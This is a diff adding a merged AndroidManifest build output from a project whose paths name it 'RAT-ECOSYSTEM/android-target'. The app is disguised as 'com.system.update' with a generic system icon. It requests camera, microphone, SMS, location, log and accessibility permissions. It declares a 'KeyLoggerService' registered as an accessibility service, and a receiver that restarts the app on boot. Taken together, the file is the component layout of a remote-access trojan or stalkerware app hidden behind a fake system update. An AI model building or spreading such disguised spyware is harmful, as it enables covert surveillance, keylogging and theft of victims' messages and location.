@@ -1,0 +1,210 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.system.update"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="24"
+9        android:targetSdkVersion="33" />
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:5:5-67
+11-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:5:22-64
+12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+12-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:6:5-79
+12-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:6:22-76
+13    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+13-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:7:5-76
+13-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:7:22-73
+14    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+14-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:8:5-80
+14-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:8:22-77
+15    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+15-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:9:5-81
+15-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:9:22-78
+16    <uses-permission android:name="android.permission.CAMERA" />
+16-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:10:5-65
+16-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:10:22-62
+17    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+17-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:11:5-71
+17-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:11:22-68
+18    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+18-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:12:5-79
+18-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:12:22-76
+19    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+19-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:13:5-81
+19-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:13:22-78
+20    <uses-permission android:name="android.permission.READ_SMS" />
+20-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:14:5-67
+20-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:14:22-64
+21    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+21-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:15:5-70
+21-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:15:22-67
+22    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+22-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:16:5-75
+22-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:16:22-72
+23    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+23-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:17:5-78
+23-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:17:22-75
+24    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+24-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:18:5-77
+24-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:18:22-74
+25    <uses-permission android:name="android.permission.WAKE_LOCK" />
+25-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:19:5-68
+25-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:19:22-65
+26    <uses-permission android:name="android.permission.VIBRATE" />
+26-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:20:5-66
+26-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:20:22-63
+27    <uses-permission android:name="android.permission.READ_LOGS" />
+27-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:21:5-68
+27-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:21:22-65
+28    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+28-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:22:5-78
+28-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:22:22-75
+29    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+29-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:23:5-85
+29-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:23:22-82
+30    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+30-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:24:5-95
+30-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:24:22-92
+31
+32    <permission
+32-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:22:5-24:47
+33        android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+33-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:23:9-81
+34        android:protectionLevel="signature" />
+34-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:24:9-44
+35
+36    <uses-permission android:name="com.system.update.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+36-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:26:5-97
+36-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:26:22-94
+37
+38    <application
+38-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:26:5-73:19
+39        android:allowBackup="true"
+39-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:27:9-35
+40        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+40-->[androidx.core:core:1.9.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\5de2de5950d0e3609670092c71592628\transformed\core-1.9.0\AndroidManifest.xml:28:18-86
+41        android:debuggable="true"
+42        android:extractNativeLibs="false"
+43        android:icon="@android:drawable/ic_menu_rotate"
+43-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:28:9-56
+44        android:label="@string/app_name"
+44-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:29:9-41
+45        android:theme="@style/Theme.App"
+45-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:30:9-41
+46        android:usesCleartextTraffic="true" >
+46-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:31:9-44
+47        <activity
+47-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:33:9-41:20
+48            android:name="com.system.update.MainActivity"
+48-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:33:19-47
+49            android:exported="true"
+49-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:34:13-36
+50            android:launchMode="singleTask"
+50-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:35:13-44
+51            android:screenOrientation="portrait" >
+51-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:36:13-49
+52            <intent-filter>
+52-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:37:13-40:29
+53                <action android:name="android.intent.action.MAIN" />
+53-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:38:17-69
+53-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:38:25-66
+54
+55                <category android:name="android.intent.category.LAUNCHER" />
+55-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:39:17-77
+55-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:39:27-74
+56            </intent-filter>
+57        </activity>
+58
+59        <service
+59-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:43:9-45:56
+60            android:name="com.system.update.UpdateService"
+60-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:43:18-47
+61            android:exported="false"
+61-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:44:13-37
+62            android:foregroundServiceType="dataSync" />
+62-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:45:13-53
+63
+64        <receiver
+64-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:47:9-53:20
+65            android:name="com.system.update.BootReceiver"
+65-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:47:19-47
+66            android:exported="true" >
+66-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:48:13-36
+67            <intent-filter>
+67-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:49:13-52:29
+68                <action android:name="android.intent.action.BOOT_COMPLETED" />
+68-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:50:17-79
+68-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:50:25-76
+69                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+69-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:51:17-79
+69-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:51:25-76
+70            </intent-filter>
+71        </receiver>
+72
+73        <service
+73-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:55:9-63:19
+74            android:name="com.system.update.KeyLoggerService"
+74-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:55:18-50
+75            android:exported="true"
+75-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:57:13-36
+76            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+76-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:56:13-79
+77            <intent-filter>
+77-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:58:13-60:29
+78                <action android:name="android.accessibilityservice.AccessibilityService" />
+78-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:59:17-92
+78-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:59:25-89
+79            </intent-filter>
+80
+81            <meta-data
+81-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:61:13-62:64
+82                android:name="android.accessibilityservice"
+82-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:61:24-67
+83                android:resource="@xml/accessibility_config" />
+83-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:62:17-61
+84        </service>
+85
+86        <provider
+86-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:65:9-71:20
+87            android:name="androidx.core.content.FileProvider"
+87-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:65:19-68
+88            android:authorities="com.system.update.fileprovider"
+88-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:66:13-65
+89            android:exported="false"
+89-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:67:13-37
+90            android:grantUriPermissions="true" >
+90-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:68:13-47
+91            <meta-data
+91-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:69:13-70:54
+92                android:name="android.support.FILE_PROVIDER_PATHS"
+92-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:69:24-74
+93                android:resource="@xml/file_paths" />
+93-->C:\Users\employee PRI\RAT-ECOSYSTEM\android-target\app\src\main\AndroidManifest.xml:70:17-51
+94        </provider>
+95        <provider
+95-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
+96            android:name="androidx.startup.InitializationProvider"
+96-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:25:13-67
+97            android:authorities="com.system.update.androidx-startup"
+97-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:26:13-68
+98            android:exported="false" >
+98-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:27:13-37
+99            <meta-data
+99-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:29:13-31:52
+100                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+100-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:30:17-75
+101                android:value="androidx.startup" />
+101-->[androidx.emoji2:emoji2:1.2.0] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\fc7579703a3b8aed30185af22931a2fc\transformed\jetified-emoji2-1.2.0\AndroidManifest.xml:31:17-49
+102            <meta-data
+102-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\ccfc228c8cbfc53787170f32b01482c0\transformed\jetified-lifecycle-process-2.4.1\AndroidManifest.xml:31:13-33:52
+103                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+103-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\ccfc228c8cbfc53787170f32b01482c0\transformed\jetified-lifecycle-process-2.4.1\AndroidManifest.xml:32:17-78
+104                android:value="androidx.startup" />
+104-->[androidx.lifecycle:lifecycle-process:2.4.1] C:\Users\employee PRI\.gradle\caches\8.14.5\transforms\ccfc228c8cbfc53787170f32b01482c0\transformed\jetified-lifecycle-process-2.4.1\AndroidManifest.xml:33:17-49
+105        </provider>
+106    </application>
+107
+108</manifest>
